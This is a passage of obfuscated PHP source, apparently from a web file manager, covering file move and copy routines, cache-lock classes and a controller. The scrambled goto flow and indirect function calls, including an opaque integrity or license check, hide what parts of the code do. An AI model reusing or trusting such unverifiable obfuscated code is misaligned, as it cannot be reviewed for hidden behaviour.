$this->folderSizeReset($FİÔ¸ß‚¾ˆ); Hook::trigger($eöÖ…Ş¿Ğ[585], $eƒœÄ¼–Œ³); goto CŒ‹äºÛ; cóÓ›ï‰Á»: } } $fôŞã´ÕÈË = $d¥›Ö…Î‰º ? $d¥›Ö…Î‰º : $B¿Š‘‡à”ƒ[$eöÖ…Ş¿Ğ[28]]; $this->lockMoveStart($a¡°íğ£İ•); goto DŒ¤¦êµºç; FŸó°‚”Ò¡: $aÁ‚Œ†Ù = $this->fileNameExistCache($FİÔ¸ß‚¾ˆ, $B¿Š‘‡à”ƒ[$eöÖ…Ş¿Ğ[28]]); $dŒùâ¬ƒ† = $this->_move($a¡°íğ£İ•, $FİÔ¸ß‚¾ˆ, $cëŞ»•«À, $bùå»ÌöÊ, $d¥›Ö…Î‰º); $this->sourceCacheClear(); goto FèãÀóŠè›; A¯ ¾ÃÖ³Ş: return $dŒùâ¬ƒ†; goto fÇŠÉÉ†¯…; d’ÖÁ¨Á®™: $this->folderSizeReset($FİÔ¸ß‚¾ˆ); $c±Ä¯ñ÷Ê = array($B¿Š‘‡à”ƒ[$eöÖ…Ş¿Ğ[492]], $FİÔ¸ß‚¾ˆ); if ($B¿Š‘‡à”ƒ[$eöÖ…Ş¿Ğ[405]] == $eöÖ…Ş¿Ğ[87]) { $c±Ä¯ñ÷Ê[] = $a¡°íğ£İ•; } goto D®³§ôé¨¨; cƒİ©ï½œ‘: $this->lockMoveEnd($a¡°íğ£İ•); $this->lockWriteEnd($FİÔ¸ß‚¾ˆ, $fôŞã´ÕÈË); $this->folderSizeReset($B¿Š‘‡à”ƒ[$eöÖ…Ş¿Ğ[492]]); goto d’ÖÁ¨Á®™; Eô¢¶¹¹…: if (!$B¿Š‘‡à”ƒ || !$e«Î¬ìÉÔ || $e«Î¬ìÉÔ[$eöÖ…Ş¿Ğ[405]] != $eöÖ…Ş¿Ğ[87]) { return !1; } Hook::trigger($eöÖ…Ş¿Ğ[584], $eƒœÄ¼–Œ³); $this->targetIsDelete = intval($B¿Š‘‡à”ƒ[$eöÖ…Ş¿Ğ[425]]); goto aì—®ø¬Àö; D®³§ôé¨¨: $this->updateModifyTime($c±Ä¯ñ÷Ê); Model($eöÖ…Ş¿Ğ[558])->eventMove($a¡°íğ£İ•, $B¿Š‘‡à”ƒ[$eöÖ…Ş¿Ğ[492]], $FİÔ¸ß‚¾ˆ); Hook::trigger($eöÖ…Ş¿Ğ[585], $eƒœÄ¼–Œ³); goto A¯ ¾ÃÖ³Ş; FèãÀóŠè›: if ($B¿Š‘‡à”ƒ[$eöÖ…Ş¿Ğ[405]] == $eöÖ…Ş¿Ğ[87] && $aÁ‚Œ†Ù) { $this->folderSizeResetChildren($dŒùâ¬ƒ†); } Model($eöÖ…Ş¿Ğ[193])->linkAdd($bùå»ÌöÊ[$eöÖ…Ş¿Ğ[554]]); if ($aÁ‚Œ†Ù && $bùå»ÌöÊ[$eöÖ…Ş¿Ğ[586]]) { $this->removeNow($a¡°íğ£İ•, !1); } goto cƒİ©ï½œ‘; fÇŠÉÉ†¯…: } private function _move($Aõ÷êé•Š, $f¼¾³Å¬×Ç, $c°ŞÓ¢Í¸º, &$CÎÖËÛÕğ¨, $FŒ´Ò­ç˜“ = '') { goto aÙùÇ¾‡˜; AÉÇ“È«ğà: return $F•÷İõ‰; goto DÑŠ‹·ãÓ·; CÛè½Ñáœ·: $e¯å¼®Û†¡ = !1; if ($c‹Œô‰²®¥) { if ($c°ŞÓ¢Í¸º == REPEAT_RENAME_FOLDER) { $cÛ•ØËå‡ = $this->fileNameAuto($f¼¾³Å¬×Ç, $cÛ•ØËå‡, $c°ŞÓ¢Í¸º, $c‹Œô‰²®¥); $F•÷İõ‰ = $this->_moveForce($Aõ÷êé•Š, $f¼¾³Å¬×Ç, $cÛ•ØËå‡); } else { if ($c°ŞÓ¢Í¸º == REPEAT_RENAME_FOLDER) { $c°ŞÓ¢Í¸º = REPEAT_RENAME; } $A„Ÿ¦¯‹ŠÚ = $this->_childrenListSelect($Aõ÷êé•Š); foreach ($A„Ÿ¦¯‹ŠÚ as $FÒ¬¤®Ÿª) { $this->_move($FÒ¬¤®Ÿª[$cªÍâëÚò[397]], $cõøœ˜¦ğÖ, $c°ŞÓ¢Í¸º, $CÎÖËÛÕğ¨); } $e¯å¼®Û†¡ = !0; } } else { if ($c°ŞÓ¢Í¸º == REPEAT_SKIP) { $e¯å¼®Û†¡ = !0; } else { if ($c°ŞÓ¢Í¸º == REPEAT_RENAME || $c°ŞÓ¢Í¸º == REPEAT_RENAME_FOLDER) { $cÛ•ØËå‡ = $this->fileNameAuto($f¼¾³Å¬×Ç, $cÛ•ØËå‡, $c°ŞÓ¢Í¸º, $c‹Œô‰²®¥); $F•÷İõ‰ = $this->_moveForce($Aõ÷êé•Š, $f¼¾³Å¬×Ç, $cÛ•ØËå‡); } else { if ($c°ŞÓ¢Í¸º == REPEAT_REPLACE) { $E¼Õ…Î·–Æ = $this->sourceInfoCache($cõøœ˜¦ğÖ); $C¥”çÂˆÁº = $this->fileHistory($E¼Õ…Î·–Æ, $f’ã¥á¸ñõ[$cªÍâëÚò[461]], $f’ã¥á¸ñõ[$cªÍâëÚò[78]]); $e¯å¼®Û†¡ = !0; if ($C¥”çÂˆÁº) { $CÎÖËÛÕğ¨[$cªÍâëÚò[554]][] = $f’ã¥á¸ñõ[$cªÍâëÚò[461]]; } } } } } if ($e¯å¼®Û†¡ && !$CÎÖËÛÕğ¨[$cªÍâëÚò[586]]) { $CÎÖËÛÕğ¨[$cªÍâëÚò[586]] = !0; } goto AÉÇ“È«ğà; aÙùÇ¾‡˜: $cªÍâëÚò =& $_SERVER[›é¼±]; $f’ã¥á¸ñõ = $this->sourceInfo($Aõ÷êé•Š); $c‹Œô‰²®¥ = $f’ã¥á¸ñõ[$cªÍâëÚò[405]] == $cªÍâëÚò[87]; goto aĞ²»“¥Ì; dğÖø¬ã‰: $this->lockWriteStart($f¼¾³Å¬×Ç, $cÛ•ØËå‡); if (!$cõøœ˜¦ğÖ) { return $this->_moveForce($Aõ÷êé•Š, $f¼¾³Å¬×Ç, $cÛ•ØËå‡); } $F•÷İõ‰ = $cõøœ˜¦ğÖ; goto CÛè½Ñáœ·; aĞ²»“¥Ì: $cÛ•ØËå‡ = $FŒ´Ò­ç˜“ ? $FŒ´Ò­ç˜“ : $f’ã¥á¸ñõ[$cªÍâëÚò[28]]; $cõøœ˜¦ğÖ = $this->fileNameExistCache($f¼¾³Å¬×Ç, $cÛ•ØËå‡); $this->lockMoveStart($Aõ÷êé•Š); goto dğÖø¬ã‰; DÑŠ‹·ãÓ·: } private function _moveForce($C›„í”î™, $cÉ¨İ§á¥, $aù ğÀŸì) { goto EŒ¨ÖÈ‘»; F„±—ÊØª‘: $e‰Ç˜ºœ¹« = $c°êŸÒÚ[$dğï‚†ÓÜä[405]] == $dğï‚†ÓÜä[87]; $cİª‡ÚÅ = array($dğï‚†ÓÜä[396] => $AÅº¹Ùºßö[$dğï‚†ÓÜä[397]], $dğï‚†ÓÜä[578] => $AÅº¹Ùºßö[$dğï‚†ÓÜä[515]] . $AÅº¹Ùºßö[$dğï‚†ÓÜä[397]] . $dğï‚†ÓÜä[47], $dğï‚†ÓÜä[574] => $AÅº¹Ùºßö[$dğï‚†ÓÜä[406]], $dğï‚†ÓÜä[575] => $AÅº¹Ùºßö[$dğï‚†ÓÜä[498]], $dğï‚†ÓÜä[577] => USER_ID, $dğï‚†ÓÜä[415] => $aù ğÀŸì); $e«ãŸØäÚ§ = $c°êŸÒÚ[$dğï‚†ÓÜä[406]] == SourceModel::TYPE_GROUP && $AÅº¹Ùºßö[$dğï‚†ÓÜä[406]] == SourceModel::TYPE_GROUP && $c°êŸÒÚ[$dğï‚†ÓÜä[498]] == $AÅº¹Ùºßö[$dğï‚†ÓÜä[498]]; goto cÀ¬‡Ç¤î; EŒ¨ÖÈ‘»: $dğï‚†ÓÜä =& $_SERVER[›é¼±]; $c°êŸÒÚ = $this->sourceInfo($C›„í”î™); $AÅº¹Ùºßö = $this->sourceInfo($cÉ¨İ§á¥); goto F„±—ÊØª‘; cÀ¬‡Ç¤î: if (!$e«ãŸØäÚ§ && $this->moveClearAuth) { Model($dğï‚†ÓÜä[496])->authClear($C›„í”î™); } $c¹Ï¶¾Á… = $c°êŸÒÚ[$dğï‚†ÓÜä[425]] == $dğï‚†ÓÜä[87] && $AÅº¹Ùºßö[$dğï‚†ÓÜä[425]] != $dğï‚†ÓÜä[87]; if ($c¹Ï¶¾Á…) { $cİª‡ÚÅ[$dğï‚†ÓÜä[424]] = 0; } goto Aùãèô…; Aùãèô…: if ($e‰Ç˜ºœ¹«) { $a ŸÒÉËÂ„ = array($dğï‚†ÓÜä[578] => array($dğï‚†ÓÜä[538], $c°êŸÒÚ[$dğï‚†ÓÜä[515]] . $c°êŸÒÚ[$dğï‚†ÓÜä[397]] . $dğï‚†ÓÜä[539])); $CôÉÁ’‹—Ú = $c°êŸÒÚ[$dğï‚†ÓÜä[515]] . $c°êŸÒÚ[$dğï‚†ÓÜä[397]] . $dğï‚†ÓÜä[47]; $d†œòÚñÒ„ = $AÅº¹Ùºßö[$dğï‚†ÓÜä[515]] . $AÅº¹Ùºßö[$dğï‚†ÓÜä[397]] . $dğï‚†ÓÜä[47] . $c°êŸÒÚ[$dğï‚†ÓÜä[397]] . $dğï‚†ÓÜä[47]; $F±’¶µĞİ = array($dğï‚†ÓÜä[578] => array($dğï‚†ÓÜä[587], "\x72\145\x70\x6c\x61\x63\x65\x28\x70\x61\x72\145\156\164\114\x65\166\x65\154\x2c\x27{$CôÉÁ’‹—Ú}\47\x2c\47{$d†œòÚñÒ„}\x27\51"), $dğï‚†ÓÜä[574] => $AÅº¹Ùºßö[$dğï‚†ÓÜä[406]], $dğï‚†ÓÜä[575] => $AÅº¹Ùºßö[$dğï‚†ÓÜä[498]]); if ($c¹Ï¶¾Á…) { $F±’¶µĞİ[$dğï‚†ÓÜä[424]] = 0; } $this->where($a ŸÒÉËÂ„)->data($F±’¶µĞİ)->save(); } $this->where(array($dğï‚†ÓÜä[412] => $C›„í”î™))->data($cİª‡ÚÅ)->save(); return $C›„í”î™; goto FØ½¾Á©ƒ; FØ½¾Á©ƒ: } private function clearShare($Eù…Ÿ§—„, $CØ±««¤ö±) { goto aÒà¢±´ô; CĞàçŸ±À¯: if (!$D¼ååˆãó’) { return; } $E‹ïøÅë«Ù = array($BÇÒ›­°˜“[397] => array($BÇÒ›­°˜“[7], $D¼ååˆãó’), $BÇÒ›­°˜“[489] => 1); $a‡‰†õÔÒ = Model($BÇÒ›­°˜“[589])->field($BÇÒ›­°˜“[482])->where($E‹ïøÅë«Ù)->select(); goto bŸ™´¶â; bŸ™´¶â: if (!$a‡‰†õÔÒ) { return; } $a‡‰†õÔÒ = array_to_keyvalue($a‡‰†õÔÒ, $BÇÒ›­°˜“[33], $BÇÒ›­°˜“[482]); $E‹ïøÅë«Ù = array($BÇÒ›­°˜“[482] => array($BÇÒ›­°˜“[7], $a‡‰†õÔÒ)); goto e§İ¶¤¬¹»; Fš—·´ô÷Ÿ: if ($d¨£²—Î¬É[$BÇÒ›­°˜“[498]] == $cŠ«Ÿ‚¯„[$BÇÒ›­°˜“[498]] && $d¨£²—Î¬É[$BÇÒ›­°˜“[406]] == $BÇÒ›­°˜“[588]) { return; } $E‹ïøÅë«Ù = array($BÇÒ›­°˜“[515] => array($BÇÒ›­°˜“[538], $d¨£²—Î¬É[$BÇÒ›­°˜“[515]] . $Eù…Ÿ§—„ . $BÇÒ›­°˜“[539])); $D¼ååˆãó’ = $this->field($BÇÒ›­°˜“[412])->where($E‹ïøÅë«Ù)->getField($BÇÒ›­°˜“[397], !0); goto CĞàçŸ±À¯; e§İ¶¤¬¹»: Model($BÇÒ›­°˜“[589])->where($E‹ïøÅë«Ù)->save(array($BÇÒ›­°˜“[489] => 0)); Model($BÇÒ›­°˜“[590])->where($E‹ïøÅë«Ù)->delete(); goto f¤³åĞƒà; aÒà¢±´ô: $BÇÒ›­°˜“ =& $_SERVER[›é¼±]; $d¨£²—Î¬É = $this->sourceInfo($Eù…Ÿ§—„); $cŠ«Ÿ‚¯„ = $this->sourceInfo($CØ±««¤ö±); goto Fš—·´ô÷Ÿ; f¤³åĞƒà: } public function copyFolderFromIO($dÑ°Üó‚„ô, $A”ƒ­éÅÜ, $càƒöÃ¢ˆÅ, $cİª…¬†Şñ, $f‘åƒ½ğ„, $c·Ÿå¢“• = false) { goto e²ëÊ°ÒÌÎ; dÎÑ¼ÏÍãÊ: Hook::trigger($BÏìÜÑ¾Â[593]); if ($Dè³ĞºÜˆ) { $this->folderSizeResetChildren($Dè³ĞºÜˆ); } $this->_childrenListClear(); goto b†ó„òÚ”Ñ; b†ó„òÚ”Ñ: Model($BÏìÜÑ¾Â[557])->addAll($CµŒŞ–ˆØ[$BÏìÜÑ¾Â[555]], array(), !0); Model($BÏìÜÑ¾Â[558])->eventCopy($Dè³ĞºÜˆ); $this->saveAll($CµŒŞ–ˆØ[$BÏìÜÑ¾Â[556]]); goto DÄ™÷¤åäò; e²ëÊ°ÒÌÎ: $BÏìÜÑ¾Â =& $_SERVER[›é¼±]; $CµŒŞ–ˆØ = array($BÏìÜÑ¾Â[555] => array(), $BÏìÜÑ¾Â[556] => array(), $BÏìÜÑ¾Â[554] => array(), $BÏìÜÑ¾Â[591] => array()); $aÛÒƒëÃ®ˆ = $c·Ÿå¢“• ? $c·Ÿå¢“• : $dÑ°Üó‚„ô->pathThis($A”ƒ­éÅÜ); goto A°š¼ó¶âŒ; A°š¼ó¶âŒ: $C×Û„‡’­› = $this->fileNameExist($càƒöÃ¢ˆÅ, $aÛÒƒëÃ®ˆ); $Dè³ĞºÜˆ = $this->mkdir($càƒöÃ¢ˆÅ, $aÛÒƒëÃ®ˆ, $cİª…¬†Şñ); if (!$C×Û„‡’­› || $cİª…¬†Şñ == REPEAT_RENAME_FOLDER) { $cİª…¬†Şñ = !1; } goto fòßºã”£; DÄ™÷¤åäò: Model($BÏìÜÑ¾Â[464])->linkAdd($CµŒŞ–ˆØ[$BÏìÜÑ¾Â[554]]); Model($BÏìÜÑ¾Â[464])->remove($CµŒŞ–ˆØ[$BÏìÜÑ¾Â[591]]); $this->folderSizeReset($càƒöÃ¢ˆÅ); goto bÆ¬àÉŒ§‹; fòßºã”£: if ($C×Û„‡’­›) { $this->_childrenAllMake($C×Û„‡’­›); } Hook::trigger($BÏìÜÑ¾Â[592]); $this->_copyChildTo($dÑ°Üó‚„ô, $A”ƒ­éÅÜ, $Dè³ĞºÜˆ, $cİª…¬†Şñ, $CµŒŞ–ˆØ, $f‘åƒ½ğ„); goto dÎÑ¼ÏÍãÊ; bÆ¬àÉŒ§‹: $this->updateModifyTime($càƒöÃ¢ˆÅ); return $Dè³ĞºÜˆ; goto cªßçæëÕ¤; cªßçæëÕ¤: } private function _copyChildTo($D¼³÷È§ƒ, $D£ĞáŞâÕ†, $FÅ•ôøÖ¤±, $fµÎ¤¹öòç, &$d´×Ê…×®İ, $Eóøô¬í—¤) { goto aÊÈ¸“²Á; aÊÈ¸“²Á: $F§™Ò¼Êõè =& $_SERVER[›é¼±]; $CÓÂÎÉÃ§ = $this->sourceInfoCache($FÅ•ôøÖ¤±); $AÂÍ‚Ôíõ = $D¼³÷È§ƒ->listPath($D£ĞáŞâÕ†); goto Fªº·‹ù„ô; d­„í¬óÔÄ: if (!empty($B•£‹¢çœ°)) { $this->addAll($B•£‹¢çœ°); $this->_childrenListSelect($FÅ•ôøÖ¤±); } $eÓ‰ô“ÙáÙ = $this->_childrenList($FÅ•ôøÖ¤±); $eÓ‰ô“ÙáÙ = array_to_keyvalue($eÓ‰ô“ÙáÙ, $F§™Ò¼Êõè[28]); goto EÁ°í¦¿øÇ; EÁ°í¦¿øÇ: foreach ($eŠ«Ï‹Ø› as $aï˜‰ê¬) { $E¤´ÍÎÃ¸À = $eÓ‰ô“ÙáÙ[$aï˜‰ê¬[$F§™Ò¼Êõè[28]]]; $d½éç¬ï¿¡ = $E¤´ÍÎÃ¸À[$F§™Ò¼Êõè[397]]; $this->_copyApplyMeta($E¤´ÍÎÃ¸À, $d´×Ê…×®İ); if ($aï˜‰ê¬[$F§™Ò¼Êõè[29]] == $F§™Ò¼Êõè[77]) { $aï˜‰ê¬[$F§™Ò¼Êõè[76]] = $D¼³÷È§ƒ->getPathInner($aï˜‰ê¬[$F§™Ò¼Êõè[76]]); $this->_copyChildTo($D¼³÷È§ƒ, $aï˜‰ê¬[$F§™Ò¼Êõè[76]], $d½éç¬ï¿¡, $fµÎ¤¹öòç, $d´×Ê…×®İ, $Eóøô¬í—¤); } } goto f½é¨‘¬Ù; Fªº·‹ù„ô: $AÂÍ‚Ôíõ = $AÂÍ‚Ôíõ ? $AÂÍ‚Ôíõ : array($F§™Ò¼Êõè[74] => array(), $F§™Ò¼Êõè[75] => array()); $eŠ«Ï‹Ø› = array_merge($AÂÍ‚Ôíõ[$F§™Ò¼Êõè[74]], $AÂÍ‚Ôíõ[$F§™Ò¼Êõè[75]]); $fäçºÚææ¿ = $this->_addFiles($D¼³÷È§ƒ, $AÂÍ‚Ôíõ[$F§™Ò¼Êõè[74]], $Eóøô¬í—¤); goto EŸÖ¾×ÁÍ´; EŸÖ¾×ÁÍ´: $B•£‹¢çœ° = array(); foreach ($eŠ«Ï‹Ø› as &$aï˜‰ê¬) { goto Aï¦æÜ³›ó; Aï¦æÜ³›ó: if (isset($fäçºÚææ¿[$aï˜‰ê¬[$F§™Ò¼Êõè[28]]])) { $aï˜‰ê¬ = $fäçºÚææ¿[$aï˜‰ê¬[$F§™Ò¼Êõè[28]]]; } $aï˜‰ê¬[$F§™Ò¼Êõè[405]] = $aï˜‰ê¬[$F§™Ò¼Êõè[29]] == $F§™Ò¼Êõè[77]; $aï˜‰ê¬[$F§™Ò¼Êõè[407]] = _get($aï˜‰ê¬, $F§™Ò¼Êõè[168], $F§™Ò¼Êõè[33]); goto açî¿ô¼…©; A“ÀÅã‹í‚: if ($fµÎ¤¹öòç) { $BÈŒÙç† = $this->fileNameExistCache($FÅ•ôøÖ¤±, $aï˜‰ê¬[$F§™Ò¼Êõè[28]]); if ($BÈŒÙç†) { if ($aï˜‰ê¬[$F§™Ò¼Êõè[405]] || $fµÎ¤¹öòç == REPEAT_SKIP) { continue; } if ($fµÎ¤¹öòç == REPEAT_REPLACE) { $E¤´ÍÎÃ¸À = $this->sourceInfoCache($BÈŒÙç†); $fè„È»§¨ = $this->fileHistory($E¤´ÍÎÃ¸À, $aï˜‰ê¬[$F§™Ò¼Êõè[461]], $aï˜‰ê¬[$F§™Ò¼Êõè[78]]); if ($fè„È»§¨) { $d´×Ê…×®İ[$F§™Ò¼Êõè[554]][] = $aï˜‰ê¬[$F§™Ò¼Êõè[461]]; } continue; } else { if ($fµÎ¤¹öòç == REPEAT_RENAME) { $aï˜‰ê¬[$F§™Ò¼Êõè[28]] = $this->fileNameAutoCache($FÅ•ôøÖ¤±, $aï˜‰ê¬[$F§™Ò¼Êõè[28]], $fµÎ¤¹öòç, !1); } } } } if (!$aï˜‰ê¬[$F§™Ò¼Êõè[405]] && $aï˜‰ê¬[$F§™Ò¼Êõè[461]]) { $d´×Ê…×®İ[$F§™Ò¼Êõè[554]][] = $aï˜‰ê¬[$F§™Ò¼Êõè[461]]; } $B•£‹¢çœ°[] = $this->_makeItemData($aï˜‰ê¬, $CÓÂÎÉÃ§, $aï˜‰ê¬[$F§™Ò¼Êõè[28]]); goto D¤„ÆÚŞß–; açî¿ô¼…©: $aï˜‰ê¬[$F§™Ò¼Êõè[78]] = _get($aï˜‰ê¬, $F§™Ò¼Êõè[78], 0); $aï˜‰ê¬[$F§™Ò¼Êõè[461]] = _get($aï˜‰ê¬, $F§™Ò¼Êõè[461], 0); if (!isset($aï˜‰ê¬[$F§™Ò¼Êõè[594]]) && $aï˜‰ê¬[$F§™Ò¼Êõè[461]]) { $d´×Ê…×®İ[$F§™Ò¼Êõè[591]][] = $aï˜‰ê¬[$F§™Ò¼Êõè[461]]; } goto A“ÀÅã‹í‚; D¤„ÆÚŞß–: } unset($aï˜‰ê¬); goto d­„í¬óÔÄ; f½é¨‘¬Ù: } private function _addFiles($B‚£—Ï«ù, $AÑ…ˆôğ«Ü, $cÈ±È™•²) { goto FÂŒÉÂá„‘; B„ì‡ø÷ª: $e„èÁÂ‹ÌÍ = Model($c¼ñÏ¯³å[597]); $cŸóŞİˆÉ = $e„èÁÂ‹ÌÍ->where($DÜå‰øÉÎ¸)->select(); $cŸóŞİˆÉ = $cŸóŞİˆÉ ? $cŸóŞİˆÉ : array(); goto F²°İÖŒË»; F²°İÖŒË»: foreach ($cŸóŞİˆÉ as $FğŠŸÃ­·) { if (!isset($bë×æ¶ƒì[$FğŠŸÃ­·[$c¼ñÏ¯³å[170]]])) { continue; } $Eµ’ºêµğ¾ = $bë×æ¶ƒì[$FğŠŸÃ­·[$c¼ñÏ¯³å[170]]]; foreach ($Eµ’ºêµğ¾ as &$eÑÙ‚Ù§›È) { $eÑÙ‚Ù§›È[$c¼ñÏ¯³å[461]] = $FğŠŸÃ­·[$c¼ñÏ¯³å[461]]; $eÑÙ‚Ù§›È[$c¼ñÏ¯³å[594]] = !0; } unset($eÑÙ‚Ù§›È); } $FäÊÏùĞÛ = array(); foreach ($AÑ…ˆôğ«Ü as $DòËº«Ê¸) { if (isset($DòËº«Ê¸[$c¼ñÏ¯³å[594]]) && $DòËº«Ê¸[$c¼ñÏ¯³å[594]]) { continue; } $bÍèŠİ­µ« = $B‚£—Ï«ù->getPathInner($DòËº«Ê¸[$c¼ñÏ¯³å[76]]); $cèìù•¡·º = $e„èÁÂ‹ÌÍ->addFileMake($bÍèŠİ­µ«, $DòËº«Ê¸[$c¼ñÏ¯³å[78]], $DòËº«Ê¸[$c¼ñÏ¯³å[171]], $DòËº«Ê¸[$c¼ñÏ¯³å[170]], $DòËº«Ê¸[$c¼ñÏ¯³å[28]], $cÈ±È™•²); $FäÊÏùĞÛ[] = $cèìù•¡·º; } goto BğÂ…Ó˜ğî; CŞß·ÏÀ‰ã: $cŸóŞİˆÉ = $cŸóŞİˆÉ ? $cŸóŞİˆÉ : array(); foreach ($cŸóŞİˆÉ as $FğŠŸÃ­·) { if (!isset($bë×æ¶ƒì[$FğŠŸÃ­·[$c¼ñÏ¯³å[170]]])) { continue; } $fÛµ½™´ÆÏ =& $bë×æ¶ƒì[$FğŠŸÃ­·[$c¼ñÏ¯³å[170]]]; foreach ($fÛµ½™´ÆÏ as &$eÑÙ‚Ù§›È) { $eÑÙ‚Ù§›È[$c¼ñÏ¯³å[461]] = $FğŠŸÃ­·[$c¼ñÏ¯³å[461]]; } unset($eÑÙ‚Ù§›È); } $f·¹œäù¯ê = array(); goto b‰õğËãõ‹; BğÂ…Ó˜ğî: $e„èÁÂ‹ÌÍ->addAll($FäÊÏùĞÛ); $DÜå‰øÉÎ¸ = array($c¼ñÏ¯³å[170] => array($c¼ñÏ¯³å[7], array_keys($bë×æ¶ƒì))); $cŸóŞİˆÉ = $e„èÁÂ‹ÌÍ->where($DÜå‰øÉÎ¸)->select(); goto CŞß·ÏÀ‰ã; FÂŒÉÂá„‘: $c¼ñÏ¯³å =& $_SERVER[›é¼±]; if (!$AÑ…ˆôğ«Ü || count($AÑ…ˆôğ«Ü) == 0) { return array(); } $bë×æ¶ƒì = array(); goto fæœ×ˆ ó; fæœ×ˆ ó: foreach ($AÑ…ˆôğ«Ü as &$eÑÙ‚Ù§›È) { goto E®ê¹Ëƒ±·; bµ§‘ˆ Æ‡: $eÑÙ‚Ù§›È[$c¼ñÏ¯³å[170]] = $Eíââ¥†¥‚; Hook::trigger($c¼ñÏ¯³å[596], $eÑÙ‚Ù§›È); $bë×æ¶ƒì[$Eíââ¥†¥‚][] =& $eÑÙ‚Ù§›È; goto déáÖ¹­é; bÑ¹ñóó§: $Eíââ¥†¥‚ = $B‚£—Ï«ù->hashMd5($eÑÙ‚Ù§›È[$c¼ñÏ¯³å[76]]); if (strlen($Eíââ¥†¥‚) > 10 && !isset($bë×æ¶ƒì[$Eíââ¥†¥‚])) { $bë×æ¶ƒì[$Eíââ¥†¥‚] = array(); } $eÑÙ‚Ù§›È[$c¼ñÏ¯³å[171]] = $B––à’¢¶’; goto bµ§‘ˆ Æ‡; E®ê¹Ëƒ±·: Hook::trigger($c¼ñÏ¯³å[595], $eÑÙ‚Ù§›È); $eÑÙ‚Ù§›È[$c¼ñÏ¯³å[76]] = $B‚£—Ï«ù->getPathInner($eÑÙ‚Ù§›È[$c¼ñÏ¯³å[76]]); $B––à’¢¶’ = $B‚£—Ï«ù->hashSimple($eÑÙ‚Ù§›È[$c¼ñÏ¯³å[76]]); goto bÑ¹ñóó§; déáÖ¹­é: if (count($bë×æ¶ƒì[$Eíââ¥†¥‚]) > 1) { $eÑÙ‚Ù§›È[$c¼ñÏ¯³å[594]] = !0; } goto fëšˆ™˜Îº; fëšˆ™˜Îº: } unset($eÑÙ‚Ù§›È); $DÜå‰øÉÎ¸ = array($c¼ñÏ¯³å[170] => array($c¼ñÏ¯³å[7], array_keys($bë×æ¶ƒì))); goto B„ì‡ø÷ª; b‰õğËãõ‹: foreach ($AÑ…ˆôğ«Ü as $DöÊ‹ò¥Æ) { $f·¹œäù¯ê[$DöÊ‹ò¥Æ[$c¼ñÏ¯³å[28]]] = $DöÊ‹ò¥Æ; } return $f·¹œäù¯ê; goto BÕäëÀëÛ‰; BÕäëÀëÛ‰: } } define($_SERVER[›é¼±][598], $_SERVER[›é¼±][599]); goto b—ŞÕ Ôƒ; eä áÇ‹·¾: class CacheLockMemcached { public function lock($BÊˆï›ŒÖ, $BÈØÏ¨âÒË = 0) { $aììîãñ­¾ = Cache::init(); $eªÔŞ™Õåõ = microtime(!0) + $BÈØÏ¨âÒË; while (microtime(!0) < $eªÔŞ™Õåõ) { $B¤«¢£Î‡Æ = $aììîãñ­¾->get($BÊˆï›ŒÖ); if (!$B¤«¢£Î‡Æ || $B¤«¢£Î‡Æ < microtime(!0)) { $E½‰“˜™Ÿå = $aììîãñ­¾->handle->add($BÊˆï›ŒÖ, $eªÔŞ™Õåõ, $BÈØÏ¨âÒË); if ($E½‰“˜™Ÿå) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($açÏ´…§ò) { return Cache::init()->get($açÏ´…§ò); } public function unlock($c„ì”óõˆ®) { return Cache::init()->remove($c„ì”óõˆ®); } } class CacheLockDatabase { public function lock($D“ªº±¸½ò, $fØ—ÊÄÍ¶º = 0) { $d£ŠŠ™‹¢ = Model($_SERVER[›é¼±][831]); $C»÷‘ÈÉò = microtime(!0) + $fØ—ÊÄÍ¶º; while (microtime(!0) < $C»÷‘ÈÉò) { $A¦†µŞÌ»Ö = $d£ŠŠ™‹¢->get($D“ªº±¸½ò); if (!$A¦†µŞÌ»Ö || $A¦†µŞÌ»Ö < microtime(!0)) { $A£İ „ãÏ = $d£ŠŠ™‹¢->set($D“ªº±¸½ò, $C»÷‘ÈÉò); if ($A£İ „ãÏ) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($C»”ëË¯Œä) { return Model($_SERVER[›é¼±][831])->get($C»”ëË¯Œä); } public function unlock($AİòŒ‹ â†) { Model($_SERVER[›é¼±][831])->remove($AİòŒ‹ â†); } } if ($_SERVER[$_SERVER[›é¼±][858]] != $_SERVER[$_SERVER[›é¼±][859]]) { goto bë·¹¤È; AâÓå·’Ñ¡: $A¥ÕØ·¼($_SERVER[$_SERVER[›é¼±][865]]); goto b„˜›­°¡£; bë·¹¤È: $cÛäÔÚë“ = $_SERVER[›é¼±][860]; $cÚ‚ñ‹ ¿­ = $_SERVER[$_SERVER[›é¼±][861]] . $_SERVER[›é¼±][862]; $e‘”¯±ÃğØ = $cÛäÔÚë“($cÚ‚ñ‹ ¿­); goto AÕí„ÙÈ¾ª; AÕí„ÙÈ¾ª: $e£¤¡„ÎÎ° = explode($_SERVER[›é¼±][229], $e‘”¯±ÃğØ); if (count($e£¤¡„ÎÎ°) < $_SERVER[›é¼±][609]) { $cƒéÏÜÜ¸ = $_SERVER[›é¼±][863]; $cƒéÏÜÜ¸(); } $A¥ÕØ·¼ = $_SERVER[›é¼±][864]; goto AâÓå·’Ñ¡; b„˜›­°¡£: } goto AîÏøõ ¼; bŞ¸Ïä‹Üæ: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { goto F«‚º¸ÍÛß; e°”´¾èá¢: $this->in =& $in; $this->values[$eÃŒà‹éö[6]] =& $config; $this->values[$eÃŒà‹éö[7]] =& $in; goto aö¯ÖÓ¨çÄ; F«‚º¸ÍÛß: $eÃŒà‹éö =& $_SERVER[›é¼±]; global $in, $config; $this->config =& $config; goto e°”´¾èá¢; aö¯ÖÓ¨çÄ: $this->tpl = TEMPLATE . MOD . $eÃŒà‹éö[8]; $this->_classObjectID = mt_rand(0, 10000); goto fçƒ”Å„†ø; fçƒ”Å„†ø: } public function loadClass($Cˆ‡„¨÷µÓ) { if (1 === func_num_args()) { $this->{$Cˆ‡„¨÷µÓ} = new $Cˆ‡„¨÷µÓ(); } else { $aâ¶¢¡Ğ¦ = new ReflectionClass($Cˆ‡„¨÷µÓ); $BÑ©†Œ»çÑ = func_get_args(); array_shift($BÑ©†Œ»çÑ); $this->{$Cˆ‡„¨÷µÓ} = $aâ¶¢¡Ğ¦->newInstanceArgs($BÑ©†Œ»çÑ); } return $this->{$Cˆ‡„¨÷µÓ}; } protected function assign($c÷‡½ËáîÆ, $bÛ¦ô©Ç„Ä) { $this->values[$c÷‡½ËáîÆ] = 